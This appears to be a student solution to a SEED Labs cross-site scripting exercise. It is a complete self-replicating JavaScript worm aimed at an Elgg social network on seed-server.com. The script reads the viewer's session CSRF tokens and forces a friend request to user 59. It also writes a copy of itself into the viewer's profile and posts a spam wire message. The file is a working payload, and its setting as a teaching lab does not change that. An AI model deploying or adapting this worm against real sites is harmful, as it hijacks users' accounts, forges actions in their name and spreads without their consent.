//<script id=worm>
window.onload = function(){
	var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	//alert(jsCode);

	if(elgg.session.user.guid!=59){
		//sending friend request to samy----------------------------------------------
		var Ajax=null;
		var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token="&__elgg_token="+elgg.security.token.__elgg_token;
		//Construct the HTTP request to add Samy as a friend.
	
		var sendurl= `http://www.seed-server.com/action/friends/add?friend=59${ts}${ts}${token}${token}`; //FILL IN
		
		//Create and send Ajax request to add friend
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();

		//modifying Alice's profile---------------------------------------------------
		var sendurl="http://www.seed-server.com/action/profile/edit";
 
    	var guid="&guid="+elgg.session.user.guid; 
    	var name="&name="+elgg.session.user.name 
    	var description = "&description="+wormCode+"&accesslevel[description]=1" 

    	var content=token+ts+name+description+guid; 

		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		//Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);

		//sending wire post with profile------------------------------------------------
		//Construct the content of your url.
		var sendurl="http://www.seed-server.com/action/thewire/add";
		var body="&body=To earn 12 USD/Hour(!), visit now\n"+"http://www.seed-server.com/profile/"+elgg.session.user.name;  
		var content=token+ts+body; 

		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		//Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
}
//</script>